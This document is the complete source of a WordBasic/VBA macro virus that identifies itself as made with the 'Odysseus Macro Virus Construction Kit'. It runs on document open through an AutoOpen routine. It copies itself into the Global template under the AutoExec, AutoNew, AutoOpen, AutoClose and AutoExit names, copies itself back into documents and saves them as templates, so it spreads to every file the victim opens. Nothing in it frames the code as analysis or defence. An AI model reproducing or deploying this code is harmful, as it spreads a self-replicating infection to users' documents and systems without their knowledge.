   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Fname$
   Dim MacName$
   On Error GoTo -1: On Error GoTo Errorhandler

   Rem Gets The Filename Of The Active Document
   Fname$ = WordBasic.[FileName$]()
   MacName$ = Fname$ + ":AutoOpen"

   Rem Odysseus Macro Virus Construction Kit Creation Marker
   WordBasic.FileSummaryInfo Comments:="[Created With Odysseus Version 1.00]"

   Rem Internal Message For AVs To See
   WordBasic.FileSummaryInfo Subject:=""

   Rem Name Of Virus
   WordBasic.FileSummaryInfo Author:=""

   Rem Infects The Global Template
   WordBasic.MacroCopy MacName$, "Global:AutoExec"
   WordBasic.MacroCopy MacName$, "Global:AutoNew"
   WordBasic.MacroCopy MacName$, "Global:AutoOpen"
   WordBasic.MacroCopy MacName$, "Global:AutoClose"
   WordBasic.MacroCopy MacName$, "Global:AutoExit"

   Rem Errorhandler Subroutine
   Errorhandler:
   If WordBasic.IsDocumentDirty() = -1 Then
   WordBasic.MacroCopy "Global:AutoOpen", MacName$
   End If
   WordBasic.FileSaveAs Format:=1
   End Sub
